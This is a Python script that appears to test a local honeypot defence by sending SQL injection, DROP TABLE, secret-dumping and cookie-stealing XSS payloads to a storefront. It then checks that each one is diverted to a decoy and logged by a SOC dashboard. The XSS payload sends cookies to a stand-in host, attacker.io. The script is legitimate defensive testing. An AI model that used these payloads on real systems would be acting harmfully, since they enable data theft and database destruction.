"""Automated Multi-Vector Attack Simulator for Sentinel DB & Query Trap.

Executes a series of realistic break-in attempts against the customer storefront (:5200),
verifies transparent 302 HTTP redirection to the honeypot (:5300), consumes single-use
canary tokens, and queries the SOC Dashboard (:5100) to display the live security audit status.
"""
import json
import urllib.parse
import urllib.request
import urllib.error
import time

STOREFRONT_URL = "http://127.0.0.1:5200"
HONEYPOT_URL = "http://127.0.0.1:5300"
SOC_URL = "http://127.0.0.1:3000"
SOC_TOKEN = "soc_token_live_2026"

ATTACK_VECTORS = [
    {
        "category": "BENIGN BASELINE",
        "name": "Legitimate Customer Search",
        "param": "q=notebook",
        "expected_status": 200,
        "desc": "Customer searching for an artisanal notebook",
    },
    {
        "category": "SQL INJECTION",
        "name": "SQLi Tautology Bypass ('1'='1)",
        "param": "q=' OR '1'='1",
        "expected_status": 302,
        "desc": "Authentication & filter bypass attempt using classic tautology",
    },
    {
        "category": "SQL INJECTION",
        "name": "SQL Comment / Auth Bypass (admin' --)",
        "param": "q=admin' --",
        "expected_status": 302,
        "desc": "Comment truncation injection targeting admin account",
    },
    {
        "category": "SQL INJECTION",
        "name": "SQLi UNION SELECT Column Probe",
        "param": "q=' UNION SELECT id, name, email, role FROM users --",
        "expected_status": 302,
        "desc": "Multi-table data extraction probe targeting schema columns",
    },
    {
        "category": "DESTRUCTIVE SQL",
        "name": "Destructive SQL (DROP TABLE)",
        "param": "q=notebook'; DROP TABLE users; --",
        "expected_status": 302,
        "desc": "Malicious command attempting database table destruction",
    },
    {
        "category": "PORT RECONNAISSANCE",
        "name": "Internal SOC Port Scanning Probe",
        "param": "port=5100",
        "expected_status": 302,
        "desc": "Reconnaissance probe scanning for internal admin SOC port :5100",
    },
    {
        "category": "CREDENTIAL PROBE",
        "name": "Users Identity Table Dump",
        "param": "q=SELECT * FROM users",
        "expected_status": 302,
        "desc": "Attacker attempting to dump the user credentials table",
    },
    {
        "category": "FINANCIAL EXFILTRATION",
        "name": "Corporate Financial Ledger Probe",
        "param": "q=SELECT * FROM financial_records WHERE balance > 1000",
        "expected_status": 302,
        "desc": "Attempting to steal corporate balances and routing codes",
    },
    {
        "category": "CLOUD SECRETS",
        "name": "Cloud Infrastructure Keys Exfiltration",
        "param": "q=SELECT parameter, synthetic_value FROM secrets WHERE key LIKE '%aws%'",
        "expected_status": 302,
        "desc": "Harvesting AWS secret keys and JWT signing credentials",
    },
    {
        "category": "CROSS-SITE SCRIPTING",
        "name": "XSS Payload Cookie Theft Attack",
        "param": "q=<script>fetch('http://attacker.io/steal?cookie=' + document.cookie)</script>",
        "expected_status": 302,
        "desc": "Cross-site scripting payload targeting analyst browser sessions",
    },
    {
        "category": "BENIGN BASELINE",
        "name": "Legitimate Product Search (Desk Lamp)",
        "param": "q=desk lamp",
        "expected_status": 200,
        "desc": "Normal shopper searching for studio lighting",
    },
]


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Custom redirect handler to inspect 302 Found without automatically following."""
    def http_error_302(self, req, fp, code, msg, headers):
        return fp

    def http_error_301(self, req, fp, code, msg, headers):
        return fp


opener = urllib.request.build_opener(NoRedirectHandler)


def run_simulation():
    print("\n" + "=" * 80)
    print("      SENTINEL DB & QUERY TRAP — MULTI-VECTOR ATTACK SIMULATION")
    print("=" * 80)
    print(f"[*] Target Storefront : {STOREFRONT_URL}")
    print(f"[*] Honeypot Decoy    : {HONEYPOT_URL}")
    print(f"[*] SOC Audit Portal  : {SOC_URL}")
    print(f"[*] Total Test Cases  : {len(ATTACK_VECTORS)}")
    print("=" * 80)

    results = []

    for idx, test in enumerate(ATTACK_VECTORS, 1):
        if test["param"].startswith("q="):
            param_val = test["param"][2:]
            encoded_query = "q=" + urllib.parse.quote_plus(param_val)
        elif test["param"].startswith("port="):
            encoded_query = test["param"]
        else:
            encoded_query = urllib.parse.quote_plus(test["param"])

        target_url = f"{STOREFRONT_URL}/?{encoded_query}"
        print(f"\n[{idx:02d}/{len(ATTACK_VECTORS):02d}] {test['category']}: {test['name']}")
        print(f"     Target URL : {target_url}")
        print(f"     Raw Query  : {test['param']}")
        print(f"     Intent     : {test['desc']}")

        try:
            req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            res = opener.open(req, timeout=3.0)
            status_code = res.status if hasattr(res, "status") else res.getcode()

            if status_code == 302:
                location = res.headers.get("Location", "")
                parsed = urllib.parse.urlparse(location)
                qs = urllib.parse.parse_qs(parsed.query)
                handoff_token = qs.get("handoff", [None])[0]

                print(f"     -> HTTP STATUS : \033[93m302 FOUND (ATTACK INTERCEPTED & REDIRECTED)\033[0m")
                print(f"     -> DIVERSION   : Redirected to {location}")
                print(f"     -> TOKEN       : {handoff_token}")

                # Consume handoff from Honeypot
                if handoff_token:
                    try:
                        hp_res = urllib.request.urlopen(f"{HONEYPOT_URL}/api/handoff/{handoff_token}", timeout=2.0)
                        hp_data = json.loads(hp_res.read().decode())
                        rows = hp_data.get("rows", [])
                        print(f"     -> HONEYPOT    : Trapped with {len(rows)} canary records from table '{hp_data.get('table')}'")
                        if rows:
                            sample = rows[0]
                            # Highlight canary identifier
                            canary_id = sample.get("canary_token") or sample.get("canary_serial") or sample.get("account_ref") or sample.get("parameter") or sample.get("item")
                            print(f"     -> HONEYTOKEN  : Delivered decoy: {canary_id}")
                    except Exception as he:
                        print(f"     -> HONEYPOT ERR: {he}")

                results.append({"name": test["name"], "status": "DIVERTED (302)", "action": "Trapped in Honeypot"})

            elif status_code == 200:
                print(f"     -> HTTP STATUS : \033[92m200 OK (SAFE NORMAL SEARCH)\033[0m")
                print(f"     -> ACTION      : Processed legitimately on production.db catalog")
                results.append({"name": test["name"], "status": "SAFE (200)", "action": "Served from Production"})
            else:
                print(f"     -> HTTP STATUS : {status_code}")
                results.append({"name": test["name"], "status": str(status_code), "action": "Unknown"})

        except Exception as e:
            print(f"     -> ERROR: {e}")
            results.append({"name": test["name"], "status": "ERROR", "action": str(e)})

        time.sleep(0.15)

    # Allow async queue 0.5s to deliver to SOC
    time.sleep(0.5)

    print("\n" + "=" * 80)
    print("      QUERYING LIVE SOC TELEMETRY AUDIT LOGS (PORT 3000)")
    print("=" * 80)

    try:
        soc_req = urllib.request.Request(
            f"{SOC_URL}/api/events?token={SOC_TOKEN}",
            headers={"Authorization": f"Bearer {SOC_TOKEN}"}
        )
        soc_res = urllib.request.urlopen(soc_req, timeout=3.0)
        soc_data = json.loads(soc_res.read().decode())
        events = soc_data.get("events", [])
        counts = soc_data.get("counts", {})

        print(f"[*] LIVE SOC MONITORED TOTALS:")
        print(f"    - Safe Customer Queries : {counts.get('safe', 0)}")
        print(f"    - Suspicious Probes     : {counts.get('suspicious', 0)}")
        print(f"    - Honeypot Diversions   : {counts.get('honeypot', 0)}")
        print(f"    - Total Durable Events  : {len(events)}")
        print("-" * 80)
        print("LATEST 11 ATTACK ATTEMPTS CAPTURED IN SOC DASHBOARD STREAM:")
        print("-" * 80)

        # Print the latest events
        for e in events[-11:]:
            ts = e.get("timestamp", "").split("T")[-1][:8]
            risk = e.get("risk", 0)
            route = e.get("route", "")
            bucket = e.get("bucket", "")
            q = (e.get("query", "") or "")[:42]
            threats = ", ".join(e.get("threats", [])) or "None"
            badge = "🚨 DIVERTED" if bucket == "honeypot" else "✅ ALLOWED "

            print(f"[{ts}] {badge} | Risk: {risk:3d}/100 | Route: {route:10s} | Query: {q:42s} | Threats: {threats}")

    except Exception as se:
        print(f"[*] Failed to fetch SOC events: {se}")

    print("=" * 80)
    print(" ALL ATTACKS EXECUTED & RECORDED IN SOC DASHBOARD!")
    print(" Check your browser at http://127.0.0.1:3000/?token=soc_token_live_2026 to see the live UI update!")
    print("=" * 80)


if __name__ == "__main__":
    run_simulation()
